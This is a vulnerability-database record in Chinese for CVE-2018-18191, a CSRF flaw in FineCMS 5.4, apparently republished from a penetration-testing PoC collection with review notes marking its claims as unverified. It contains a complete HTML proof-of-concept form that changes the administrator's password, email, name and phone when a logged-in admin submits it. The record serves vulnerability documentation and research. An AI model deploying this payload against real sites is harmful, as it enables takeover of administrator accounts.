---
cve: "CVE-2018-18191"
source: "Mr-xn/Penetration_Testing_POC"
product: "FineCMS5.4"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-18191"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Finecms_v5.4存在CSRF漏洞可修改管理员账户密码2"
prerequisites: "来源所述条件，未列明部分仍待核：已登录管理用户，跨站表单提交带凭证；uid1被认定管理员须核验"
side_effects: "未执行；本文需注意的操作影响：表单无自动提交，必须点击Submit；同请求还更改邮箱/姓名/手机，副作用应说明；member编辑接口被称管理员密码修改需确认账号体系；缺执行响应和防护上下文"
source_status: "unknown"
id: "vw-6a66cfde9ffa197fa017f12b"
entity_id: "ve-6a66cfde9ffa197fa017f12b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录管理用户，跨站表单提交带凭证；uid1被认定管理员须核验

- **事实待核（1）**：与180同表单，仅主机与简介/归属信息不同；保留本篇日期作者CVE链接。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（2）**：表单无自动提交，必须点击Submit；同请求还更改邮箱/姓名/手机，副作用应说明。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **证据待核（3）**：member编辑接口被称管理员密码修改需确认账号体系；缺执行响应和防护上下文。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Finecms_v5.4存在CSRF漏洞可修改管理员账户密码2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Finecms_v5.4存在CSRF漏洞可修改管理员账户密码|2018-10-07|踏月留香|[http://www.finecms.net/](http://www.finecms.net/) | [http://down.chinaz.com/soft/32596.htm](http://down.chinaz.com/soft/32596.htm) |5.4| [CVE-2018-18191](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18191)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。   

### POC实现代码如下：  

> exp代码如下：  

``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/admin.php?c=member&m=edit&uid=1" method="POST">
      <input type="hidden" name="page" value="0" />
      <input type="hidden" name="member&#91;email&#93;" value="admin&#64;163&#46;com" />
      <input type="hidden" name="member&#91;name&#93;" value="admin" />
      <input type="hidden" name="member&#91;phone&#93;" value="18888888888" />
      <input type="hidden" name="member&#91;password&#93;" value="888888" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
